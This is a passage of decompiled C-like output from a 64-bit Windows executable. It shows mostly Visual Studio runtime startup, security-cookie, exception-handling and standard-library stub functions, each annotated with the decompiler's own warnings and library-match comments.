      if ((HANDLE)CONCAT44(local_2a8._4_4_,(undefined4)local_2a8) == (HANDLE)0xffffffffffffffff)
      goto LAB_14000e90e;
      iVar3 = CloseHandle((HANDLE)CONCAT44(local_2a8._4_4_,(undefined4)local_2a8));
    }
    if (iVar3 == 0) {
LAB_14000e948:
                    // WARNING: Subroutine does not return
      terminate();
    }
  }
LAB_14000e90e:
  FUN_14000eed0(local_28 ^ (ulonglong)auStack712);
  return;
}



// Library Function - Single Match
//  __std_fs_open_handle
// 
// Libraries: Visual Studio 2017 Release, Visual Studio 2019 Release

DWORD __std_fs_open_handle(HANDLE *param_1,LPCWSTR param_2,DWORD param_3,DWORD param_4)

{
  DWORD DVar1;
  HANDLE pvVar2;
  
  DVar1 = 0;
  pvVar2 = CreateFileW(param_2,param_3,7,(LPSECURITY_ATTRIBUTES)0x0,3,param_4,(HANDLE)0x0);
  *param_1 = pvVar2;
  if (pvVar2 == (HANDLE)0xffffffffffffffff) {
    DVar1 = GetLastError();
  }
  return DVar1;
}



// WARNING: Unknown calling convention yet parameter storage is locked

void std::_Xregex_error(error_type param_1)

{
                    // WARNING: Could not recover jumptable at 0x00014000e9af. Too many branches
                    // WARNING: Treating indirect jump as call
  _Xregex_error(param_1);
  return;
}



// WARNING: Unknown calling convention yet parameter storage is locked

uint std::_Random_device(void)

{
  uint uVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e9b5. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = _Random_device();
  return uVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void __thiscall std::locale::facet::_Incref(facet *this)

{
                    // WARNING: Could not recover jumptable at 0x00014000e9bb. Too many branches
                    // WARNING: Treating indirect jump as call
  _Incref();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

_Facet_base * __thiscall std::locale::facet::_Decref(facet *this)

{
  _Facet_base *p_Var1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e9c1. Too many branches
                    // WARNING: Treating indirect jump as call
  p_Var1 = (_Facet_base *)_Decref();
  return p_Var1;
}



// WARNING: Exceeded maximum restarts with more pending

void __thiscall
std::basic_streambuf<char,struct_std::char_traits<char>_>::imbue
          (basic_streambuf_char_struct_std__char_traits_char___ *this,locale *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00014000e9c7. Too many branches
                    // WARNING: Treating indirect jump as call
  imbue();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

int __thiscall
std::basic_streambuf<char,struct_std::char_traits<char>_>::sync
          (basic_streambuf_char_struct_std__char_traits_char___ *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e9cd. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = sync();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

basic_streambuf_char_struct_std__char_traits_char___ * __thiscall
std::basic_streambuf<char,struct_std::char_traits<char>_>::setbuf
          (basic_streambuf_char_struct_std__char_traits_char___ *this,char *param_1,__int64 param_2)

{
  basic_streambuf_char_struct_std__char_traits_char___ *pbVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e9d3. Too many branches
                    // WARNING: Treating indirect jump as call
  pbVar1 = (basic_streambuf_char_struct_std__char_traits_char___ *)setbuf();
  return pbVar1;
}



// WARNING: Exceeded maximum restarts with more pending

__int64 __thiscall
std::basic_streambuf<char,struct_std::char_traits<char>_>::xsputn
          (basic_streambuf_char_struct_std__char_traits_char___ *this,char *param_1,__int64 param_2)

{
  __int64 _Var1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e9d9. Too many branches
                    // WARNING: Treating indirect jump as call
  _Var1 = xsputn();
  return _Var1;
}



// WARNING: Exceeded maximum restarts with more pending

__int64 __thiscall
std::basic_streambuf<char,struct_std::char_traits<char>_>::xsgetn
          (basic_streambuf_char_struct_std__char_traits_char___ *this,char *param_1,__int64 param_2)

{
  __int64 _Var1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e9df. Too many branches
                    // WARNING: Treating indirect jump as call
  _Var1 = xsgetn();
  return _Var1;
}



// WARNING: Exceeded maximum restarts with more pending

int __thiscall
std::basic_streambuf<char,struct_std::char_traits<char>_>::uflow
          (basic_streambuf_char_struct_std__char_traits_char___ *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e9e5. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = uflow();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

__int64 __thiscall
std::basic_streambuf<char,struct_std::char_traits<char>_>::showmanyc
          (basic_streambuf_char_struct_std__char_traits_char___ *this)

{
  __int64 _Var1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e9eb. Too many branches
                    // WARNING: Treating indirect jump as call
  _Var1 = showmanyc();
  return _Var1;
}



// WARNING: Exceeded maximum restarts with more pending

void __thiscall
std::basic_streambuf<char,struct_std::char_traits<char>_>::_Unlock
          (basic_streambuf_char_struct_std__char_traits_char___ *this)

{
                    // WARNING: Could not recover jumptable at 0x00014000e9f1. Too many branches
                    // WARNING: Treating indirect jump as call
  _Unlock();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void __thiscall
std::basic_streambuf<char,struct_std::char_traits<char>_>::_Lock
          (basic_streambuf_char_struct_std__char_traits_char___ *this)

{
                    // WARNING: Could not recover jumptable at 0x00014000e9f7. Too many branches
                    // WARNING: Treating indirect jump as call
  _Lock();
  return;
}



// WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall
// Library Function - Single Match
//  void __cdecl `eh vector destructor iterator'(void * __ptr64,unsigned __int64,unsigned
// __int64,void (__cdecl*)(void * __ptr64))
// 
// Libraries: Visual Studio 2017 Release, Visual Studio 2019 Release

void _eh_vector_destructor_iterator_
               (void *param_1,__uint64 param_2,__uint64 param_3,FuncDef14 *param_4)

{
  while( true ) {
    if (param_3 == 0) break;
    (*param_4)();
    param_3 = param_3 - 1;
  }
  return;
}



// WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall
// Library Function - Single Match
//  void __cdecl __ArrayUnwind(void * __ptr64,unsigned __int64,unsigned __int64,void (__cdecl*)(void
// * __ptr64))
// 
// Library: Visual Studio 2019 Release

void __ArrayUnwind(void *param_1,__uint64 param_2,__uint64 param_3,FuncDef15 *param_4)

{
  __uint64 _Var1;
  
  for (_Var1 = 0; _Var1 != param_3; _Var1 = _Var1 + 1) {
    (*param_4)();
  }
  return;
}



// Library Function - Single Match
//  void * __ptr64 __cdecl operator new(unsigned __int64)
// 
// Libraries: Visual Studio 2017 Release, Visual Studio 2019 Release

void * operator_new(__uint64 param_1)

{
  code *pcVar1;
  int iVar2;
  void *pvVar3;
  
  do {
    pvVar3 = malloc(param_1);
    if (pvVar3 != (void *)0x0) {
      return pvVar3;
    }
    iVar2 = _callnewh(param_1);
  } while (iVar2 != 0);
  if (param_1 == 0xffffffffffffffff) {
    FUN_14000b454();
    pcVar1 = (code *)swi(3);
    pvVar3 = (void *)(*pcVar1)();
    return pvVar3;
  }
  FUN_14000f358();
  pcVar1 = (code *)swi(3);
  pvVar3 = (void *)(*pcVar1)();
  return pvVar3;
}



void free(void *_Memory)

{
  free(_Memory);
  return;
}



// Library Function - Single Match
//  __scrt_acquire_startup_lock
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

ulonglong __scrt_acquire_startup_lock(void)

{
  ulonglong uVar1;
  bool bVar2;
  undefined7 extraout_var;
  longlong in_GS_OFFSET;
  ulonglong uVar3;
  
  bVar2 = __scrt_is_ucrt_dll_in_use();
  uVar3 = CONCAT71(extraout_var,bVar2);
  if ((int)uVar3 == 0) {
LAB_14000eb42:
    uVar3 = uVar3 & 0xffffffffffffff00;
  }
  else {
    uVar1 = *(ulonglong *)(*(longlong *)(in_GS_OFFSET + 0x30) + 8);
    do {
      LOCK();
      bVar2 = DAT_140017810 == 0;
      DAT_140017810 = DAT_140017810 ^ (ulonglong)bVar2 * (DAT_140017810 ^ uVar1);
      uVar3 = !bVar2 * DAT_140017810;
      if (bVar2) goto LAB_14000eb42;
    } while (uVar1 != uVar3);
    uVar3 = CONCAT71((int7)(uVar3 >> 8),1);
  }
  return uVar3;
}



// Library Function - Single Match
//  __scrt_initialize_crt
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

ulonglong __scrt_initialize_crt(int param_1)

{
  ulonglong uVar1;
  
  if (param_1 == 0) {
    DAT_140017818 = 1;
  }
  FUN_14000f188();
  uVar1 = FUN_14000f830();
  if ((char)uVar1 != '\0') {
    uVar1 = FUN_14000f830();
    if ((char)uVar1 != '\0') {
      return uVar1 & 0xffffffffffffff00 | 1;
    }
    uVar1 = FUN_14000f830();
  }
  return uVar1 & 0xffffffffffffff00;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __scrt_initialize_onexit_tables
// 
// Library: Visual Studio 2019 Release

undefined8 __scrt_initialize_onexit_tables(uint param_1)

{
  code *pcVar1;
  bool bVar2;
  ulonglong in_RAX;
  undefined7 extraout_var;
  undefined8 uVar3;
  
  if (DAT_140017819 == '\0') {
    if (1 < param_1) {
      FUN_14000f39c(5);
      pcVar1 = (code *)swi(3);
      uVar3 = (*pcVar1)();
      return uVar3;
    }
    bVar2 = __scrt_is_ucrt_dll_in_use();
    if (((int)CONCAT71(extraout_var,bVar2) == 0) || (param_1 != 0)) {
      in_RAX = 0xffffffffffffffff;
      _DAT_140017820 = 0xffffffff;
      uRam0000000140017824 = 0xffffffff;
      uRam0000000140017828 = 0xffffffff;
      uRam000000014001782c = 0xffffffff;
      _DAT_140017830 = 0xffffffffffffffff;
      _DAT_140017838 = 0xffffffff;
      uRam000000014001783c = 0xffffffff;
      uRam0000000140017840 = 0xffffffff;
      uRam0000000140017844 = 0xffffffff;
      _DAT_140017848 = 0xffffffffffffffff;
    }
    else {
      in_RAX = _initialize_onexit_table(&DAT_140017820);
      if (((int)in_RAX != 0) ||
         (in_RAX = _initialize_onexit_table(&DAT_140017838), (int)in_RAX != 0)) {
        return in_RAX & 0xffffffffffffff00;
      }
    }
    DAT_140017819 = '\x01';
  }
  return CONCAT71((int7)(in_RAX >> 8),1);
}



// WARNING: Removing unreachable block (ram,0x00014000ecb5)

ulonglong FUN_14000ec28(longlong param_1)

{
  ulonglong uVar1;
  uint7 uVar2;
  IMAGE_SECTION_HEADER *pIVar3;
  
  uVar1 = 0;
  for (pIVar3 = &IMAGE_SECTION_HEADER_1400001f0; pIVar3 != (IMAGE_SECTION_HEADER *)&DAT_1400002e0;
      pIVar3 = pIVar3 + 1) {
    if (((ulonglong)(uint)pIVar3->VirtualAddress <= param_1 - 0x140000000U) &&
       (uVar1 = (ulonglong)(uint)(pIVar3->Misc + pIVar3->VirtualAddress),
       param_1 - 0x140000000U < uVar1)) goto LAB_14000ec9e;
  }
  pIVar3 = (IMAGE_SECTION_HEADER *)0x0;
LAB_14000ec9e:
  if (pIVar3 == (IMAGE_SECTION_HEADER *)0x0) {
    uVar1 = uVar1 & 0xffffffffffffff00;
  }
  else {
    uVar2 = (uint7)(uVar1 >> 8);
    if ((int)pIVar3->Characteristics < 0) {
      uVar1 = (ulonglong)uVar2 << 8;
    }
    else {
      uVar1 = CONCAT71(uVar2,1);
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  __scrt_release_startup_lock
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void __scrt_release_startup_lock(char param_1)

{
  bool bVar1;
  undefined3 extraout_var;
  
  bVar1 = __scrt_is_ucrt_dll_in_use();
  if ((CONCAT31(extraout_var,bVar1) != 0) && (param_1 == '\0')) {
    DAT_140017810 = 0;
  }
  return;
}



// Library Function - Single Match
//  __scrt_uninitialize_crt
// 
// Library: Visual Studio 2019 Release

undefined __scrt_uninitialize_crt(undefined8 param_1,char param_2)

{
  if ((DAT_140017818 == '\0') || (param_2 == '\0')) {
    FUN_14000f830();
    FUN_14000f830();
  }
  return 1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _onexit
// 
// Library: Visual Studio 2019 Release

_onexit_t _onexit(_onexit_t _Func)

{
  int iVar1;
  _onexit_t p_Var2;
  
  if (_DAT_140017820 == -1) {
    iVar1 = _crt_atexit();
  }
  else {
    iVar1 = _register_onexit_function(&DAT_140017820);
  }
  p_Var2 = (_onexit_t)0x0;
  if (iVar1 == 0) {
    p_Var2 = _Func;
  }
  return p_Var2;
}



// Library Function - Single Match
//  atexit
// 
// Library: Visual Studio 2019 Release

int atexit(void *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = _onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



// Library Function - Single Match
//  __GSHandlerCheckCommon
// 
// Libraries: Visual Studio 2017 Release, Visual Studio 2019 Release

void __GSHandlerCheckCommon(ulonglong param_1,longlong param_2,uint *param_3)

{
  ulonglong uVar1;
  ulonglong uVar2;
  
  uVar2 = param_1;
  if ((*(byte *)param_3 & 4) != 0) {
    uVar2 = (longlong)(int)param_3[1] + param_1 & (longlong)(int)-param_3[2];
  }
  uVar1 = (ulonglong)*(uint *)(*(longlong *)(param_2 + 0x10) + 8);
  if ((*(byte *)(uVar1 + 3 + *(longlong *)(param_2 + 8)) & 0xf) != 0) {
    param_1 = param_1 + (*(byte *)(uVar1 + 3 + *(longlong *)(param_2 + 8)) & 0xfffffff0);
  }
  FUN_14000eed0(param_1 ^ *(ulonglong *)((longlong)(int)(*param_3 & 0xfffffff8) + uVar2));
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __chkstk
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __chkstk(void)

{
  undefined *in_RAX;
  undefined *puVar1;
  undefined *puVar2;
  longlong in_GS_OFFSET;
  undefined local_res8 [32];
  
  puVar1 = local_res8 + -(longlong)in_RAX;
  if (local_res8 < in_RAX) {
    puVar1 = (undefined *)0x0;
  }
  puVar2 = *(undefined **)(in_GS_OFFSET + 0x10);
  if (puVar1 < puVar2) {
    do {
      puVar2 = puVar2 + -0x1000;
      *puVar2 = 0;
    } while ((undefined *)((ulonglong)puVar1 & 0xfffffffffffff000) != puVar2);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_14000eed0(longlong param_1)

{
  code *pcVar1;
  BOOL BVar2;
  undefined *puVar3;
  undefined auStack56 [8];
  undefined auStack48 [48];
  
  if ((param_1 == DAT_140017038) && ((short)((ulonglong)param_1 >> 0x30) == 0)) {
    return;
  }
  puVar3 = auStack56;
  BVar2 = IsProcessorFeaturePresent(0x17);
  if (BVar2 != 0) {
    pcVar1 = (code *)swi(0x29);
    (*pcVar1)(2);
    puVar3 = auStack48;
  }
  *(undefined8 *)(puVar3 + -8) = 0x14000f64f;
  capture_previous_context((PCONTEXT)&DAT_140017900);
  _DAT_140017870 = *(undefined8 *)(puVar3 + 0x38);
  _DAT_140017998 = puVar3 + 0x40;
  _DAT_140017980 = *(undefined8 *)(puVar3 + 0x40);
  _DAT_140017860 = 0xc0000409;
  _DAT_140017864 = 1;
  _DAT_140017878 = 1;
  DAT_140017880 = 2;
  *(longlong *)(puVar3 + 0x20) = DAT_140017038;
  *(undefined8 *)(puVar3 + 0x28) = DAT_140017030;
  *(undefined8 *)(puVar3 + -8) = 0x14000f6f1;
  DAT_1400179f8 = _DAT_140017870;
  __raise_securityfailure((_EXCEPTION_POINTERS *)&PTR_DAT_140012480);
  return;
}



undefined8 * FUN_14000eef0(undefined8 *param_1,ulonglong param_2)

{
  *param_1 = type_info::vftable;
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



void FUN_14000ef1c(void)

{
  code *pcVar1;
  bool bVar2;
  char cVar3;
  int iVar4;
  undefined8 uVar5;
  undefined4 *puVar6;
  undefined7 extraout_var;
  
  _set_app_type();
  uVar5 = FUN_14000f818();
  _set_fmode((int)uVar5);
  uVar5 = FUN_14000f52c();
  puVar6 = (undefined4 *)__p__commode();
  *puVar6 = (int)uVar5;
  uVar5 = __scrt_initialize_onexit_tables(1);
  if ((char)uVar5 != '\0') {
    FUN_14000f874();
    atexit(&LAB_14000f8b0);
    FUN_14000f380();
    iVar4 = _configure_wide_argv();
    if (iVar4 == 0) {
      FUN_14000f820();
      bVar2 = FUN_14000f858();
      if ((int)CONCAT71(extraout_var,bVar2) != 0) {
        __setusermatherr();
      }
      _guard_check_icall();
      _guard_check_icall();
      uVar5 = FUN_14000f52c();
      _configthreadlocale((int)uVar5);
      cVar3 = FUN_14000f830();
      if (cVar3 != '\0') {
        _initialize_wide_environment();
      }
      FUN_14000f52c();
      uVar5 = thunk_FUN_14000f52c();
      if ((int)uVar5 == 0) {
        return;
      }
    }
  }
  FUN_14000f39c(7);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



undefined8 FUN_14000efd4(void)

{
  FUN_14000f83c();
  return 0;
}



// WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall

uint entry(void)

{
  bool bVar1;
  WORD WVar2;
  int iVar3;
  ulonglong uVar4;
  code **ppcVar5;
  longlong *plVar6;
  undefined8 uVar7;
  IMAGE_DOS_HEADER *pIVar8;
  uint unaff_EBX;
  
  __security_init_cookie();
  uVar4 = __scrt_initialize_crt(1);
  if ((char)uVar4 == '\0') {
    FUN_14000f39c(7);
  }
  else {
    bVar1 = false;
    uVar4 = __scrt_acquire_startup_lock();
    unaff_EBX = unaff_EBX & 0xffffff00 | (uint)(uVar4 & 0xff);
    if (DAT_140017808 != 1) {
      if (DAT_140017808 == 0) {
        DAT_140017808 = 1;
        iVar3 = _initterm_e(&DAT_140011590,&DAT_1400115a8);
        if (iVar3 != 0) {
          return 0xff;
        }
        _initterm();
        DAT_140017808 = 2;
      }
      else {
        bVar1 = true;
      }
      __scrt_release_startup_lock((char)(uVar4 & 0xff));
      ppcVar5 = (code **)FUN_14000f864();
      if ((*ppcVar5 != (code *)0x0) &&
         (uVar4 = FUN_14000ec28((longlong)ppcVar5), (char)uVar4 != '\0')) {
        (**ppcVar5)();
      }
      plVar6 = (longlong *)FUN_14000f86c();
      if ((*plVar6 != 0) && (uVar4 = FUN_14000ec28((longlong)plVar6), (char)uVar4 != '\0')) {
        _register_thread_local_exe_atexit_callback(*plVar6);
      }
      WVar2 = __scrt_get_show_window_mode();
      uVar7 = _get_wide_winmain_command_line();
      pIVar8 = &IMAGE_DOS_HEADER_140000000;
      unaff_EBX = FUN_14000d214(&IMAGE_DOS_HEADER_140000000,0,uVar7,(ulonglong)WVar2);
      uVar4 = FUN_14000f530();
      if ((char)uVar4 != '\0') {
        if (!bVar1) {
          _cexit();
        }
        __scrt_uninitialize_crt(CONCAT71((int7)((ulonglong)pIVar8 >> 8),1),'\0');
        return unaff_EBX;
      }
      goto LAB_14000f161;
    }
  }
  FUN_14000f39c(7);
LAB_14000f161:
                    // WARNING: Subroutine does not return
  exit(unaff_EBX);
}



// WARNING: Removing unreachable block (ram,0x00014000f252)
// WARNING: Removing unreachable block (ram,0x00014000f1c2)
// WARNING: Removing unreachable block (ram,0x00014000f19b)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 FUN_14000f188(void)

{
  int *piVar1;
  uint *puVar2;
  longlong lVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  byte in_XCR0;
  
  piVar1 = (int *)cpuid_basic_info(0);
  uVar6 = 0;
  puVar2 = (uint *)cpuid_Version_info(1);
  uVar4 = puVar2[3];
  if ((piVar1[2] ^ 0x49656e69U | piVar1[3] ^ 0x6c65746eU | piVar1[1] ^ 0x756e6547U) == 0) {
    _DAT_140017050 = 0xffffffffffffffff;
    uVar5 = *puVar2 & 0xfff3ff0;
    _DAT_140017048 = 0x8000;
    if ((((uVar5 == 0x106c0) || (uVar5 == 0x20660)) || (uVar5 == 0x20670)) ||
       ((uVar5 - 0x30650 < 0x21 &&
        ((0x100010001U >> ((ulonglong)(uVar5 - 0x30650) & 0x3f) & 1) != 0)))) {
      DAT_140017850 = DAT_140017850 | 1;
    }
  }
  if (6 < *piVar1) {
    lVar3 = cpuid_Extended_Feature_Enumeration_info(7);
    uVar6 = *(uint *)(lVar3 + 4);
    if ((uVar6 >> 9 & 1) != 0) {
      DAT_140017850 = DAT_140017850 | 2;
    }
  }
  _DAT_140017040 = 1;
  DAT_140017044 = 2;
  if ((uVar4 >> 0x14 & 1) != 0) {
    _DAT_140017040 = 2;
    DAT_140017044 = 6;
    if ((((uVar4 >> 0x1b & 1) != 0) && ((uVar4 >> 0x1c & 1) != 0)) && ((in_XCR0 & 6) == 6)) {
      DAT_140017044 = 0xe;
      _DAT_140017040 = 3;
      if ((uVar6 & 0x20) != 0) {
        _DAT_140017040 = 5;
        DAT_140017044 = 0x2e;
        if (((uVar6 & 0xd0030000) == 0xd0030000) && ((in_XCR0 & 0xe0) == 0xe0)) {
          DAT_140017044 = 0x6e;
          _DAT_140017040 = 6;
        }
      }
    }
  }
  return 0;
}



void _guard_check_icall(void)

{
  return;
}



undefined8 * FUN_14000f338(undefined8 *param_1)

{
  param_1[2] = 0;
  param_1[1] = "bad allocation";
  *param_1 = std::bad_alloc::vftable;
  return param_1;
}



void FUN_14000f358(void)

{
  undefined8 local_28 [5];
  
  FUN_14000f338(local_28);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_28,(ThrowInfo *)&DAT_140014ed8);
}



void free(void *_Memory)

{
                    // WARNING: Could not recover jumptable at 0x00014000f93e. Too many branches
                    // WARNING: Treating indirect jump as call
  free(_Memory);
  return;
}



undefined8 FUN_14000f380(void)

{
  return 1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __scrt_is_ucrt_dll_in_use
// 
// Library: Visual Studio 2019 Release

bool __scrt_is_ucrt_dll_in_use(void)

{
  return _DAT_140017060 != 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_14000f394(void)

{
  _DAT_140017854 = 0;
  return;
}



void FUN_14000f39c(undefined4 param_1)

{
  code *pcVar1;
  BOOL BVar2;
  LONG LVar3;
  PRUNTIME_FUNCTION FunctionEntry;
  undefined *puVar4;
  undefined8 in_stack_00000000;
  DWORD64 local_res10;
  undefined local_res18 [8];
  undefined local_res20 [8];
  undefined auStack1480 [8];
  undefined auStack1472 [232];
  undefined local_4d8 [152];
  undefined *local_440;
  DWORD64 local_3e0;
  
  puVar4 = auStack1480;
  BVar2 = IsProcessorFeaturePresent(0x17);
  if (BVar2 != 0) {
    pcVar1 = (code *)swi(0x29);
    (*pcVar1)(param_1);
    puVar4 = auStack1472;
  }
  *(undefined8 *)(puVar4 + -8) = 0x14000f3d0;
  FUN_14000f394();
  *(undefined8 *)(puVar4 + -8) = 0x14000f3e1;
  memset(local_4d8,0,0x4d0);
  *(undefined8 *)(puVar4 + -8) = 0x14000f3eb;
  RtlCaptureContext(local_4d8);
  *(undefined8 *)(puVar4 + -8) = 0x14000f405;
  FunctionEntry = RtlLookupFunctionEntry(local_3e0,&local_res10,(PUNWIND_HISTORY_TABLE)0x0);
  if (FunctionEntry != (PRUNTIME_FUNCTION)0x0) {
    *(undefined8 *)(puVar4 + 0x38) = 0;
    *(undefined **)(puVar4 + 0x30) = local_res18;
    *(undefined **)(puVar4 + 0x28) = local_res20;
    *(undefined **)(puVar4 + 0x20) = local_4d8;
    *(undefined8 *)(puVar4 + -8) = 0x14000f446;
    RtlVirtualUnwind(0,local_res10,local_3e0,FunctionEntry,*(PCONTEXT *)(puVar4 + 0x20),
                     *(PVOID **)(puVar4 + 0x28),*(PDWORD64 *)(puVar4 + 0x30),
                     *(PKNONVOLATILE_CONTEXT_POINTERS *)(puVar4 + 0x38));
  }
  local_440 = &stack0x00000008;
  *(undefined8 *)(puVar4 + -8) = 0x14000f478;
  memset(puVar4 + 0x50,0,0x98);
  *(undefined8 *)(puVar4 + 0x60) = in_stack_00000000;
  *(undefined4 *)(puVar4 + 0x50) = 0x40000015;
  *(undefined4 *)(puVar4 + 0x54) = 1;
  *(undefined8 *)(puVar4 + -8) = 0x14000f49a;
  BVar2 = IsDebuggerPresent();
  *(undefined **)(puVar4 + 0x40) = puVar4 + 0x50;
  *(undefined **)(puVar4 + 0x48) = local_4d8;
  *(undefined8 *)(puVar4 + -8) = 0x14000f4bb;
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  *(undefined8 *)(puVar4 + -8) = 0x14000f4c6;
  LVar3 = UnhandledExceptionFilter((_EXCEPTION_POINTERS *)(puVar4 + 0x40));
  if ((LVar3 == 0) && (BVar2 != 1)) {
    *(undefined8 *)(puVar4 + -8) = 0x14000f4d6;
    FUN_14000f394();
  }
  return;
}



// Library Function - Single Match
//  __scrt_get_show_window_mode
// 
// Libraries: Visual Studio 2017 Release, Visual Studio 2019 Release

WORD __scrt_get_show_window_mode(void)

{
  WORD WVar1;
  undefined local_78 [64];
  WORD local_38;
  
  memset(local_78,0,0x68);
  GetStartupInfoW((LPSTARTUPINFOW)local_78);
  WVar1 = 10;
  if ((local_78[60] & 1) != 0) {
    WVar1 = local_38;
  }
  return WVar1;
}



undefined8 thunk_FUN_14000f52c(void)

{
  return 0;
}



undefined8 FUN_14000f52c(void)

{
  return 0;
}



ulonglong FUN_14000f530(void)

{
  HMODULE pHVar1;
  ulonglong uVar2;
  int *piVar3;
  
  pHVar1 = GetModuleHandleW((LPCWSTR)0x0);
  if ((((pHVar1 == (HMODULE)0x0) || (*(short *)&pHVar1->unused != 0x5a4d)) ||
      (piVar3 = (int *)((longlong)&pHVar1->unused + (longlong)pHVar1[0xf].unused), *piVar3 != 0x4550
      )) || ((pHVar1 = (HMODULE)0x20b, *(short *)(piVar3 + 6) != 0x20b || ((uint)piVar3[0x21] < 0xf)
             ))) {
    uVar2 = (ulonglong)pHVar1 & 0xffffffffffffff00;
  }
  else {
    uVar2 = CONCAT71(2,piVar3[0x3e] != 0);
  }
  return uVar2;
}



void FUN_14000f584(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f58b. Too many branches
                    // WARNING: Treating indirect jump as call
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)&LAB_14000f594);
  return;
}



// Library Function - Single Match
//  __raise_securityfailure
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void __raise_securityfailure(_EXCEPTION_POINTERS *param_1)

{
  HANDLE hProcess;
  
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter(param_1);
  hProcess = GetCurrentProcess();
                    // WARNING: Could not recover jumptable at 0x00014000f61d. Too many branches
                    // WARNING: Treating indirect jump as call
  TerminateProcess(hProcess,0xc0000409);
  return;
}



// Library Function - Single Match
//  capture_previous_context
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void capture_previous_context(PCONTEXT param_1)

{
  DWORD64 ControlPc;
  PRUNTIME_FUNCTION FunctionEntry;
  int iVar1;
  DWORD64 local_res8;
  ulonglong local_res10;
  PVOID local_res18 [2];
  
  RtlCaptureContext();
  ControlPc = param_1->Rip;
  iVar1 = 0;
  do {
    FunctionEntry = RtlLookupFunctionEntry(ControlPc,&local_res8,(PUNWIND_HISTORY_TABLE)0x0);
    if (FunctionEntry == (PRUNTIME_FUNCTION)0x0) {
      return;
    }
    RtlVirtualUnwind(0,local_res8,ControlPc,FunctionEntry,param_1,local_res18,&local_res10,
                     (PKNONVOLATILE_CONTEXT_POINTERS)0x0);
    iVar1 = iVar1 + 1;
  } while (iVar1 < 2);
  return;
}



// Library Function - Single Match
//  __security_init_cookie
// 
// Libraries: Visual Studio 2017 Release, Visual Studio 2019 Release

void __security_init_cookie(void)

{
  DWORD DVar1;
  _FILETIME local_res8;
  _FILETIME local_res10;
  uint local_res18;
  undefined4 uStackX28;
  
  if (DAT_140017038 == 0x2b992ddfa232) {
    local_res10 = (_FILETIME)0x0;
    GetSystemTimeAsFileTime(&local_res10);
    local_res8 = local_res10;
    DVar1 = GetCurrentThreadId();
    local_res8 = (_FILETIME)((ulonglong)local_res8 ^ (ulonglong)DVar1);
    DVar1 = GetCurrentProcessId();
    local_res8 = (_FILETIME)((ulonglong)local_res8 ^ (ulonglong)DVar1);
    QueryPerformanceCounter((LARGE_INTEGER *)&local_res18);
    DAT_140017038 =
         ((ulonglong)local_res18 << 0x20 ^ CONCAT44(uStackX28,local_res18) ^ (ulonglong)local_res8 ^
         (ulonglong)&local_res8) & 0xffffffffffff;
    if (DAT_140017038 == 0x2b992ddfa232) {
      DAT_140017038 = 0x2b992ddfa233;
    }
  }
  DAT_140017030 = ~DAT_140017038;
  return;
}



undefined8 FUN_14000f818(void)

{
  return 0x4000;
}



void FUN_14000f820(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000f827. Too many branches
                    // WARNING: Treating indirect jump as call
  InitializeSListHead((PSLIST_HEADER)&DAT_140017dd0);
  return;
}



undefined FUN_14000f830(void)

{
  return 1;
}



undefined * FUN_14000f834(void)

{
  return &DAT_140017de0;
}



void FUN_14000f83c(void)

{
  ulonglong *puVar1;
  
  puVar1 = (ulonglong *)FUN_14000d1bc();
  *puVar1 = *puVar1 | 0x24;
  puVar1 = (ulonglong *)FUN_14000f834();
  *puVar1 = *puVar1 | 2;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

bool FUN_14000f858(void)

{
  return _DAT_140017058 == 0;
}



undefined * FUN_14000f864(void)

{
  return &DAT_140017df0;
}



